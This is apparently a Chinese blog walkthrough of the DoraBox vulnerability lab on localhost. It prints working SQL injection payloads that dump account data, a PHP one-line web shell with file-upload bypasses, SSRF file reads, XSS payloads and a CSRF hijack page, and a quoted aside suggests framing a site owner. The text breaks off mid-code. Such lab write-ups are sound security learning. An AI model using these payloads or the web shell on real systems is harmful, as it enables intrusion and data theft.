+<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 %23' &amp;submit=submit</code> <img src="dorabox_sqlchar002.png" alt=""></p>
+<p>下面就是和数字型注入相同的操作。</p>
+</li>
+<li>
+<p>利用 order by 或者 group by 判断字段数：</p>
+<p>正常： <code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 order by 3 %23' &amp;submit=submit</code></p>
+<p>报错： <code>http://localhost/dorabox/sql_injection/sql_string.php</code> <br>
+?title=1’ or 1=1 order by 4 %23’<br>
+&amp;submit=submit</p>
+<p>以上说明需要 3 个字段</p>
+</li>
+<li>
+<p>爆该数据库所有表和 news 表有多少条数据</p>
+<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union select  1,(select table_rows from information_schema.tables where table_name='news' and table_schema = database()),(select group_concat(table_name) from information_schema.tables where table_schema = database())  %23' &amp;submit=submit</code></p>
+<p>因为没有 title 为’1’的文章，所以直接只会出后面攻击所得数据<img src="dorabox_sqlchar003.png" alt=""></p>
+<p>注入的三个字段：</p>
+<ul>
+<li>
+<p>1 并不会输出，所以随意</p>
+</li>
+<li>
+<p>(select table_rows from information_schema.tables where table_name=‘news’ and table_schema = database ()) ，用于统计该表的数据数量，没什么用，就是想试试看</p>
+</li>
+<li>
+<p>(select group_concat (table_name) from information_schema.tables where table_schema = database ())，利用 group_concat () 拼接字符串爆表名</p>
+</li>
+</ul>
+</li>
+<li>
+<p>爆字段</p>
+<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,group_concat(column_name) from information_schema.columns where table_name = 'account' and table_schema = database() %23' &amp;submit=submit</code></p>
+<p><img src="dorabox_sqlchar004.png" alt=""></p>
+</li>
+<li>
+<p>爆内容</p>
+<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,concat_ws('-',id,rest,own) from account %23' &amp;submit=submit</code></p>
+<p><img src="dorabox_sqlchar005.png" alt=""></p>
+</li>
+</ol>
+<h2 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结：</h2>
+<p>在 sql 注入中，注释常用’–+’，而注释符’#‘和’–' 一般不能直接使用。</p>
+<ul>
+<li>‘#’：sql 手工注入时，浏览器地址栏输入的 '＃' 并没有发送到后台，因为 url 中 #号是用来指导浏览器动作的（例如锚点），对服务器端完全无用，# 的 url 编码是 %23，替换后可行</li>
+<li>‘–’：在字符型注入时，–和单引号连接在一起时，无法形成有效的 mysql 语句，可能造成单引号未闭合错误。所以可以使用–’，也可以尝试用多行注释符（块注释符 /**/）、一对英文括号、换行符或加号来代替空格</li>
+</ul>
+<h1 id="sqli搜索型"><a class="markdownIt-Anchor" href="#sqli搜索型">#</a> SQLi 搜索型</h1>
+<p>类似字符型注入，主要就是闭合</p>
+<p><img src="dorabox_sqlss001.png" alt=""></p>
+<h2 id="过程-2"><a class="markdownIt-Anchor" href="#过程-2">#</a> 过程：</h2>
+<ol>
+<li>
+<p>进行闭合</p>
+<p>‘<a target="_blank" rel="noopener" href="http://localhost/dorabox/sql_injection/sql_search.php">http://localhost/dorabox/sql_injection/sql_search.php</a><br>
+?content=’ or ‘%’=’<br>
+&amp;submit=submit’</p>
+<p><img src="dorabox_sqlss002.png" alt=""></p>
+</li>
+<li>
+<p>判断需要的字段数 3 个（感觉这种方法有点低级）</p>
+<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=' union select 1,2,3 and '%'='  &amp;submit=submit</code></p>
+<p><img src="dorabox_sqlss003.png" alt=""></p>
+</li>
+<li>
+<p>爆表，常规手段</p>
+<p><code>SELECT * FROM news WHERE content like '%$$$$$$' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and '%'=' %'</code></p>
+<p><img src="dorabox_sqlss004.png" alt=""></p>
+</li>
+<li>
+<p>爆字段</p>
+<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'account' and '%'=' &amp;submit=submit</code></p>
+<p><img src="dorabox_sqlss005.png" alt=""></p>
+</li>
+<li>
+<p>爆内容</p>
+<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, concat_ws('--',id,rest,own) from account where '%'=' &amp;submit=submit</code></p>
+<p><img src="dorabox_sqlss006.png" alt=""></p>
+</li>
+</ol>
+<h2 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2">#</a> 总结：</h2>
+<p>sql 通配符</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">通配符</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">%</td>
+<td style="text-align:left">替代 0 个或多个字符</td>
+</tr>
+<tr>
+<td style="text-align:left">_</td>
+<td style="text-align:left">替代一个字符</td>
+</tr>
+<tr>
+<td style="text-align:left">[<em>charlist</em>]</td>
+<td style="text-align:left">字符列中的任何单一字符</td>
+</tr>
+<tr>
+<td style="text-align:left">[^<em>charlist</em>] 或 [!<em>charlist</em>]</td>
+<td style="text-align:left">不在字符列中的任何单一字符</td>
+</tr>
+</tbody>
+</table>
+<h1 id="js限制文件上传"><a class="markdownIt-Anchor" href="#js限制文件上传">#</a> JS 限制文件上传</h1>
+<p>前端进行了文件名后缀过滤</p>
+<p><img src="dorabox_fp_js003.png" alt=""></p>
+<h2 id="过程-3"><a class="markdownIt-Anchor" href="#过程-3">#</a> 过程：</h2>
+<ol>
+<li>打开源代码，把蓝色框部分内容删除，即绕过验证函数<img src="dorabox_fp_js002.png" alt=""></li>
+<li>上传成功，路径告诉了，菜刀直连</li>
+</ol>
+<p><img src="dorabox_fp_js001.png" alt=""></p>
+<h2 id="总结-3"><a class="markdownIt-Anchor" href="#总结-3">#</a> 总结：</h2>
+<p>遇见了一个问题，还没有解决：</p>
+<p>为什么修改 js 代码，加上 |.php 不生效，而删除函数验证一改一个准？</p>
+<p>据说就是不可以改（小菜菜，要在前端控制台输入该函数，才会生效）</p>
+<h1 id="任意文件上传"><a class="markdownIt-Anchor" href="#任意文件上传">#</a> 任意文件上传</h1>
+<p>随便传</p>
+<p><img src="dorabox_fp_all001.png" alt=""></p>
+<h2 id="过程-4"><a class="markdownIt-Anchor" href="#过程-4">#</a> 过程：</h2>
+<p>根据题目提示，获取到文件上传的路径，用菜刀直接连接</p>
+<p><img src="dorabox_fp_all002.png" alt=""></p>
+<p>上传的 php 一句话木马 attack.php：</p>
+<p><code> &lt;?php @eval($_POST['attack']) ?&gt;</code></p>
+<h2 id="总结-4"><a class="markdownIt-Anchor" href="#总结-4">#</a> 总结：</h2>
+<ol>
+<li>
+<p>php 一句话木马基本原理：</p>
+<ul>
+<li>@表示后面即使执行错误，也不报错 ($_POST [attack] 如果不加 @会报错，因为 attack 变量没有定义就被使用了，报错会暴露密码)</li>
+<li>eval () 函数，括号内的语句字符串什么的都当做代码执行</li>
+<li>$_POST [‘attack’] 表示以 post 的方式接收变量 attack，把变量 attack 里面的字符串当做 php 代码执行。例如，若接收到参数 attack=echo ‘attack’，此时代码变为 eval (“echo ‘attack’;”)，就会输出 attack</li>
+</ul>
+</li>
+<li>
+<p>TruBW 博主举的常用的方法：</p>
+<blockquote>
+<p>你想查看目标硬盘里有没有小黄片，可以用 php 函数： <code>opendir()</code>  和 <code>readdir()</code>  等等。想上传点小黄片，诬陷站主，就用 php 函数： <code>move_uploaded_file</code> ，当然相应的 html 要写好。你想执行 cmd 命令，则用 <code>exec()</code> 。</p>
+</blockquote>
+</li>
+</ol>
+<h1 id="mime限制文件上传"><a class="markdownIt-Anchor" href="#mime限制文件上传">#</a> MIME 限制文件上传</h1>
+<p>.jpg 可以上传成功</p>
+<p><img src="dorabox_fp_mime001.png" alt=""></p>
+<h2 id="过程-5"><a class="markdownIt-Anchor" href="#过程-5">#</a> 过程：</h2>
+<ol>
+<li>打开网络抓包，把后缀修改为.php<img src="dorabox_fp_mime002.png" alt=""></li>
+<li>上传成功，菜刀直连<img src="dorabox_fp_mime003.png" alt=""></li>
+</ol>
+<h2 id="总结-5"><a class="markdownIt-Anchor" href="#总结-5">#</a> 总结：</h2>
+<p><strong>MIME 介绍：</strong></p>
+<blockquote>
+<p>MIME（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定的应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。（来自百度百科）</p>
+</blockquote>
+<p><strong>常见的类型：</strong></p>
+<table>
+<thead>
+<tr>
+<th>文件类型</th>
+<th>后缀</th>
+<th>数据包中的文件类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>超文本标记语言文本</td>
+<td>.html</td>
+<td>text/html</td>
+</tr>
+<tr>
+<td>xml 文档</td>
+<td>.xml</td>
+<td>text/xml</td>
+</tr>
+<tr>
+<td>xhtml 文档</td>
+<td>.xhtml</td>
+<td>application/xhtml+xml</td>
+</tr>
+<tr>
+<td>普通文本文档</td>
+<td>.text</td>
+<td>text/plain</td>
+</tr>
+<tr>
+<td>RTF 文本</td>
+<td>.rtf</td>
+<td>application/rtf</td>
+</tr>
+<tr>
+<td>PDF 文档</td>
+<td>.pdf</td>
+<td>application/pdf</td>
+</tr>
+<tr>
+<td>Miscrosoft Word 文件</td>
+<td>.word</td>
+<td>application/msword</td>
+</tr>
+<tr>
+<td>PNG 图像</td>
+<td>.png</td>
+<td>image/png</td>
+</tr>
+<tr>
+<td>GIF 图形</td>
+<td>.gif</td>
+<td>image/gif</td>
+</tr>
+<tr>
+<td>JPEG 图形</td>
+<td>.jpeg,.jpg</td>
+<td>image/jpeg</td>
+</tr>
+<tr>
+<td>au 声音文件</td>
+<td>.au</td>
+<td>audio/basic</td>
+</tr>
+<tr>
+<td>MIDI 音乐文件</td>
+<td>mid,.midi</td>
+<td>audio/midi,audio/x-midi</td>
+</tr>
+<tr>
+<td>RealAudio 音乐</td>
+<td>.ra,.ram</td>
+<td>audio/x-pn-realaudio</td>
+</tr>
+<tr>
+<td>AVI 文件</td>
+<td>.avi</td>
+<td>video/x-msvideo</td>
+</tr>
+<tr>
+<td>GZIP 文件</td>
+<td>.gz</td>
+<td>application/x-gzip</td>
+</tr>
+<tr>
+<td>TAR 文件</td>
+<td>.tar</td>
+<td>application/x-tar</td>
+</tr>
+<tr>
+<td>任意的二进制数据</td>
+<td></td>
+<td>application/octet-stream</td>
+</tr>
+</tbody>
+</table>
+<p><strong>出现在 HTTP 数据包中可能有的位置（不是很有画面感…）：</strong></p>
+<blockquote>
+<p><strong>MIME 信息头有：</strong></p>
+<p>MIME-Version:</p>
+<p>这个头提供了所用 MIME 的版本号。这个值习惯上为 1.0。</p>
+<p><strong>Content-Type:</strong></p>
+<p>它定义了数据的类型，以便数据能被适当的处理。有效的类型有：text，image，audio，video，applications，multipart 和 message。注意任何一个二进制附件都应该被叫做 application/octet- stream。这个头的一些用例为：image/jpg, application/mswork，multipart/mixed，这只是很少的一部分。</p>
+<p><strong>Content-Transfer-Encoding:</strong></p>
+<p>这是所有头中最重要的一个，因为它说明了对数据所执行的编码方式，客户 / MUA 将用它对附件进行解码。对于每个附件，可以使用 7bit，8bit，binary ，quoted-printable，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/base64">base64</a> 和 custom 中的一种编码方式。7bit 编码是用在 US ASCII<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E9%9B%86"> 字符集</a>上的常用的一种编码方式，也就是，保持它的原样。8bit 和 binary 编码一般不用。对人类可读的标准文本，如果传输要经过对格式有影响的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E5%85%B3">网关</a>时对其进行保护，可以使用 quoted printable 。Base64 是一种通用方法，在需要决定使用哪一种编码方法时，它提供了一个不用费脑子的选择；它通常用在二进制，非文本数据上。注意，任何非 7bit 数据必须用一种模式编码，这样它就可以通过 Internet<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6%E7%BD%91%E5%85%B3"> 邮件网关</a>！</p>
+<p><strong>Content-ID:</strong></p>
+<p>如果 Content-Type 是 message/external-body 或 multipart/alternative 时，这个头就有用了，它超出了本文的范围。</p>
+<h3 id="content-description"><a class="markdownIt-Anchor" href="#content-description">#</a> Content-Description:</h3>
+<p>这是一个可选的头。它是任何信息段内容的自由文本描述。描述必须使用 us-ascii 码。</p>
+<p><strong>Content-Disposition:</strong></p>
+<p>一个试验性的头，它用于给客户程序 / MUA 提供提示，来决定是否在行内显示附件或作为单独的附件。</p>
+<p>MIME 段头（出现在实际的 MIME 附件部分的头），除了 MIME-Version 头，可以拥有以上任何头字段。如果一个 MIME 头是信息块的一部分，它将作用于整个信息体。例如，如果 Content-Transfer-Encoding 显示在信息（指整个信息）头中，它应用于整个信息体，但是如果它显示在一个 MIME 段里，它 &quot;只能&quot; 用于那个段中。</p>
+<p>注意：其可以对自动对收到的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6">邮件</a>进行解密。</p>
+</blockquote>
+<p>[以上拓展来自这里</p>
+<h1 id="拓展名限制文件上传"><a class="markdownIt-Anchor" href="#拓展名限制文件上传">#</a> 拓展名限制文件上传</h1>
+<p>后台进行了文件名后缀过滤，无法上传.php 文件</p>
+<h2 id="过程-6"><a class="markdownIt-Anchor" href="#过程-6">#</a> 过程：</h2>
+<ol>
+<li>尝试大小写绕过，把文件名后缀改为.phP，上传成功，菜刀直连<img src="dorabox_fp_hz001.png" alt=""></li>
+</ol>
+<h2 id="总结-6"><a class="markdownIt-Anchor" href="#总结-6">#</a> 总结：</h2>
+<p>因为写过 upload_labs (没写完)，就有思路</p>
+<h1 id="内容限制文件上传"><a class="markdownIt-Anchor" href="#内容限制文件上传">#</a> 内容限制文件上传</h1>
+<p>对文件内容进行判读过滤</p>
+<h2 id="过程-7"><a class="markdownIt-Anchor" href="#过程-7">#</a> 过程：</h2>
+<ol>
+<li>
+<p>在木马文件最前面加上 GIF89a:</p>
+<p><code>GIF89a &lt;?php @eval($_POST['attack']) ?&gt;</code></p>
+</li>
+<li>
+<p>上传成功，路径告诉了，菜刀直连</p>
+</li>
+</ol>
+<p><img src="dorabox_fp_nr001.png" alt=""></p>
+<h2 id="总结-7"><a class="markdownIt-Anchor" href="#总结-7">#</a> 总结：</h2>
+<p>GIF89a 是文件头校验内容，服务器看到这里就会以为是 GIF 文件。</p>
+<p>常见的文件头对应关系（入职培训上的，这个我以前还找过，就是因为菜，没有找到）：</p>
+<ol>
+<li>JPEG;.JPE;.JPG，”JPGGraphic File”</li>
+<li>gif，”GIF 89A”</li>
+<li>zip，”Zip Compressed”</li>
+<li>doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>
+</ol>
+<h1 id="sqli数字手工注入"><a class="markdownIt-Anchor" href="#sqli数字手工注入">#</a> SQLi 数字手工注入</h1>
+<p><img src="dorabox_sqlnum001.png" alt=""></p>
+<h2 id="过程-8"><a class="markdownIt-Anchor" href="#过程-8">#</a> 过程：</h2>
+<ol>
+<li>
+<p>输出报错：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/dorabox/sql_injection/sql_num.php?id=1">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> order by 4 &amp;submit=submit<img src="dorabox_sqlnum007.png" alt=""> 正常输出：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/dorabox/sql_injection/sql_num.php">http://localhost/dorabox/sql_injection/sql_num.php</a><br>
+?id=1 order by 3 &amp;submit=submit</p>
+<p>以上说明，应输出 3 个字段</p>
+</li>
+<li>
+<p>用 count (*) 统计表内数据，只有两条数据：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/dorabox/sql_injection/sql_num.php?id=3">http://localhost/dorabox/sql_injection/sql_num.php?id=3</a> union select 10086,count(*),10087 from news order by 1 desc limit 1<br>
+&amp;submit=submit</p>
+<p><img src="dorabox_sqlnum002.png" alt=""></p>
+</li>
+<li>
+<p>爆数据库</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/dorabox/sql_injection/sql_num.php">http://localhost/dorabox/sql_injection/sql_num.php</a><br>
+?id=1 union select 3,database(),user() order by 1 desc limit 1<br>
+&amp;submit=submit<img src="dorabox_sqlnum003.png" alt=""></p>
+</li>
+<li>
+<p>爆表名，利用 group_concat ()：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/dorabox/sql_injection/sql_num.php?id=1">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> union select 3,group_concat(table_name),0 from information_schema.tables where table_schema = database() order by 1 desc<br>
+&amp;submit=submit<img src="dorabox_sqlnum004.png" alt=""></p>
+</li>
+<li>
+<p>爆字段：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/dorabox/sql_injection/sql_num.php">http://localhost/dorabox/sql_injection/sql_num.php</a><br>
+?id=1 union select 3,group_concat(column_name),0 from information_schema.columns where table_name = ‘account’ order by 1 desc<br>
+&amp;submit=submit<img src="dorabox_sqlnum005.png" alt=""></p>
+</li>
+<li>
+<p>爆内容：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/dorabox/sql_injection/sql_num.php">http://localhost/dorabox/sql_injection/sql_num.php</a><br>
+?id = 1 union select 3,concat_ws(&quot;,&quot;,id,rest,own),0 from account where 1=1 order by 1 desc<img src="dorabox_sqlnum006.png" alt=""></p>
+</li>
+</ol>
+<h2 id="总结-8"><a class="markdownIt-Anchor" href="#总结-8">#</a> 总结：</h2>
+<ul>
+<li>
+<p>mysql 字符拼接方法</p>
+<ol>
+<li>
+<p>concat()</p>
+<p>功能：将多个字符串连接成一个字符串</p>
+<p>语法：concat (str1, str2, …)</p>
+<p>说明：返回结果为连接参数产生的字符串，如果有任何一个参数为 null，则返回值为 null。</p>
+</li>
+<li>
+<p>concat_ws()</p>
+<p>功能：将多个字符串拼接成一个字符串，以自定义的符号进行分割</p>
+<p>语法：concat (separator, str1, str2, …)</p>
+<p>说明：第一个参数指定分隔符，若为 null, 返回结果也会为 null</p>
+</li>
+<li>
+<p>group_concat()</p>
+<p>功能：将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果</p>
+<p>语法：group_concat ([distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’] )</p>
+<p>说明：通过使用 distinct 可以排除重复值；如果希望对结果中的值进行排序，可以使用 order by 句子；separator 是一个字符串，缺省为一个逗号</p>
+</li>
+</ol>
+</li>
+<li>
+<p>information_schema</p>
+<p>information_schema 数据库是 MySQL 自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括 “数据词典” 和 “系统目录”。</p>
+<p>常用表：</p>
+<ol>
+<li>COLLATION_CHARACTER_SET_APPLICABILITY 表，和字符编码相关，包含的常用列：
+<ol>
+<li>COLLATION_NAME 排序规则明</li>
+<li>CHARACTER_SET_NAME 与排序规则关联的字符集的名称</li>
+</ol>
+</li>
+<li>TABLES 表，提供库中表信息，包含的常用列：
+<ol>
+<li>Table_catalog 数据表登记目录</li>
+<li>Table_schema 数据表所属的数据库名</li>
+<li>Table_name 表名</li>
+<li>Table_type 表类型 [system view | base table]</li>
+<li>Engine 使用的数据库引擎 [MyISAM | CSV | InnoDB]</li>
+<li>Version 版本，默认值 10</li>
+<li>Row_format 行格式 [Compact | Dynamic | Fixed]</li>
+<li>Table_rows 表里所存多少行数据 (早知道有这个，我就)</li>
+<li>Avg_row_length 平均行长度</li>
+<li>Data_length 数据长度</li>
+<li>Max_data_length 最大数据长度</li>
+<li>Index_length 索引长度</li>
+<li>Create_time 表的创建时间</li>
+<li>Update_time 表的更新时间</li>
+<li>Check_time 表的检查时间</li>
+<li>Table_collation 表的字符校验编码集</li>
+<li>Chechsum 校验和</li>
+</ol>
+</li>
+<li>COLUMNS 表，提供表中字段信息，包含的常用列：
+<ol>
+<li>TABLE_CATALOG 包含该列的表所属的目录名称。该值始终为 def。</li>
+<li>TABLE_SCHEMA 字段所在数据库的名称。</li>
+<li>TABLE_NAME 字段所在表的名称。</li>
+<li></li>
+<li>COLUMN_NAME 字段的名称。</li>
+<li>ORDINAL_POSITION 表中字段的位置。（可能会用 order by ORDINAL_POSITION）COLUMN_TYPE 字段数据类型。</li>
+<li>COLUMN_DEFAULT 字段的默认值。如果字段具有显示缺省值 NULL，或者字段定义不含 DEFAULT 子句，则该值为 NULL。</li>
+<li>COLUMN_TYPE 类型名称以及别的信息，比如精度或长度（以字符为单位</li>
+<li>CHARACTER_OCTET_LENGTH 对于字符串列，最大长度（以字节为单位</li>
+<li>CHARACTER_MAXIMUM_LENGTH 对于字符串列，最大长度（以字符为单位） COLUMN_KEY 名称是否已建立索引</li>
+</ol>
+</li>
+</ol>
+<h1 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf">#</a> SSRF</h1>
+<p><img src="dorabox_ssrf001.png" alt=""></p>
+<h2 id="过程-9"><a class="markdownIt-Anchor" href="#过程-9">#</a> 过程：</h2>
+<ol>
+<li>利用 file 进行文件读取<img src="dorabox_ssrf002.png" alt=""></li>
+</ol>
+<h2 id="总结-9"><a class="markdownIt-Anchor" href="#总结-9">#</a> 总结：</h2>
+<ul>
+<li>其实就是有 url 的，需要访问别的资源的就可能有 ssrf 漏洞。</li>
+<li>利用方式（里面好多没试过的，等我写完报告要去玩玩）
+<ol>
+<li>利用 file 协议读取本地文件（类似文件包含，想要利用这个漏洞，需要知道里面有什么文件或者目录，然后进行内容提取）</li>
+<li>对服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li>
+<li>攻击运行在内网或本地的应用程序</li>
+<li>对内网 web 应用进行指纹识别，识别企业内部的资产信息</li>
+<li>攻击内外网的 web 应用，主要是使用 HTTP GET 请求就可以实现的攻击</li>
+</ol>
+</li>
+<li>一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li>
+</ul>
+</li>
+</ul>
+<h1 id="任意代码执行"><a class="markdownIt-Anchor" href="#任意代码执行">#</a> 任意代码执行</h1>
+<p>根据题目提示，就是随便输代码，然后服务器执行脚本</p>
+<h2 id="过程-10"><a class="markdownIt-Anchor" href="#过程-10">#</a> 过程：</h2>
+<ol>
+<li>phpinfo ()，查看 php 版本信息<img src="dorabox_code002.png" alt=""></li>
+</ol>
+<h2 id="总结-10"><a class="markdownIt-Anchor" href="#总结-10">#</a> 总结：</h2>
+<p>代码执行漏洞就是通过执行脚本代码，进行渗透</p>
+<h1 id="任意命令执行"><a class="markdownIt-Anchor" href="#任意命令执行">#</a> 任意命令执行</h1>
+<p>根据题目提示，就是随便输命令</p>
+<h2 id="过程-11"><a class="markdownIt-Anchor" href="#过程-11">#</a> 过程：</h2>
+<ol>
+<li>whoami，查看服务器信息<img src="dorabox_cmd001.png" alt=""></li>
+</ol>
+<h2 id="总结-11"><a class="markdownIt-Anchor" href="#总结-11">#</a> 总结：</h2>
+<p>看源码是利用 exec () 函数，直接调用操作系统的命令</p>
+<h1 id="反射xss"><a class="markdownIt-Anchor" href="#反射xss">#</a> 反射 XSS</h1>
+<p>输入 12345678，查看源代码，发现服务器返回了输入的字符数统计，以及输入的字符串，在 html 中</p>
+<p><img src="dorabox_xss_ref001.png" alt=""></p>
+<h2 id="过程-12"><a class="markdownIt-Anchor" href="#过程-12">#</a> 过程：</h2>
+<ol>
+<li>加入 js 代码，alert 一下<img src="dorabox_xss_ref002.png" alt=""></li>
+</ol>
+<h2 id="总结-12"><a class="markdownIt-Anchor" href="#总结-12">#</a> 总结：</h2>
+<p>​	XSS 反射型，就是通过 get 或者 post 请求，被后台处理过数据，并响应到前端页面上。可以通过使用白名单过滤掉输入的恶意字符进行修复。</p>
+<h1 id="存储型xss"><a class="markdownIt-Anchor" href="#存储型xss">#</a> 存储型 XSS</h1>
+<p><img src="dorabox_xss_sav001.png" alt=""></p>
+<h2 id="过程-13"><a class="markdownIt-Anchor" href="#过程-13">#</a> 过程：</h2>
+<ol>
+<li>alert 试一下</li>
+</ol>
+<figure class="highlight html"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;/XSS/&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="dorabox_xss_sav001.png" alt=""></p>
+<ol start="2">
+<li>submit 后返回了字符数，没有 alert，刷新一下，重新加载，发现存储成功</li>
+</ol>
+<p><img src="dorabox_xss_sav002.png" alt=""></p>
+<h2 id="总结-13"><a class="markdownIt-Anchor" href="#总结-13">#</a> 总结：</h2>
+<p>存储型就是把用户输入的恶意字符串存储在服务器（数据库），一般在可以存储数据并会返回到前端代码的地方搞吧，别的用户点了，就会跳到小黑屋这种。或者利用一些平台脚本搞事情。</p>
+<p>漏洞修复：在服务端过滤掉 HTML 的尖括号，比如 php 的自带函数 strip_tags ()，然后对于一些可以执行的函数进行手动写函数过滤，过滤掉 onchange (),onload (),onclick (),onerror () 等等函数</p>
+<h1 id="dom型xss"><a class="markdownIt-Anchor" href="#dom型xss">#</a> DOM 型 XSS</h1>
+<p><img src="dorabox_xss_sav001.png" alt=""></p>
+<h2 id="过程-14"><a class="markdownIt-Anchor" href="#过程-14">#</a> 过程：</h2>
+<ol>
+<li>
+<p>万能 alert，<script>alert(1)</script>：<img src="dorabox_xss_dom001.png" alt=""></p>
+<p>带有 xss 的 url：<a target="_blank" rel="noopener" href="http://localhost/dorabox/xss/dom_xss.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=submit">http://localhost/dorabox/xss/dom_xss.php?name=&lt;script&gt;alert(1)&lt;%2Fscript&gt;&amp;submit=submit</a></p>
+</li>
+<li>
+<p>看源码是在这里打印的： <code>document.write(getURLValue('name'));</code></p>
+</li>
+</ol>
+<h2 id="总结-14"><a class="markdownIt-Anchor" href="#总结-14">#</a> 总结：</h2>
+<p>DOM 型 xss，仅仅在前端页面进行操作的，通过修改页面的 DOM 节点形成的 XSS，效果和反射型类似。</p>
+<p>攻击者在 URL 中插入 XSS 代码，前端页面直接从 url 中获取 xss 代码并输出到页面，导致 xss 代码的执行，攻击者将带有 xss 代码的 url 发给用户，用户打开后收到攻击。</p>
+<h1 id="csrf跨域资源"><a class="markdownIt-Anchor" href="#csrf跨域资源">#</a> CSRF 跨域资源</h1>
+<p><img src="dorabox_csrf_json001.png" alt=""></p>
+<h2 id="过程-15"><a class="markdownIt-Anchor" href="#过程-15">#</a> 过程：</h2>
+<ol username:Vulkey_Chen,mobilephone:13188888888,email:admin@gh0st.cn,address:\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd,sex:CoolMan="">
+<li>
+<p>构造 html 来劫持</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Ajax<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Ajax 发送 get 请求<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">  xhr.responseType = <span class="string">&quot;text&quot;</span>;</span></span><br><span class="line"><span class="javascript">  xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://localhost/dorabox/csrf/userinfo.php&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">  xhr.onreadystatechange= <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(<span class="built_in">this</span>.status == <span class="number">200</span>)&#123;</span></span><br><span class="line"><span class="javascript">		alert(<span class="built_in">this</span>.responseText);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"> &#125;;</span></span><br><span class="line"><span class="javascript">  xhr.send();</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">ajax();</span></span><br><span class="line"><span class="javascript"></span><span 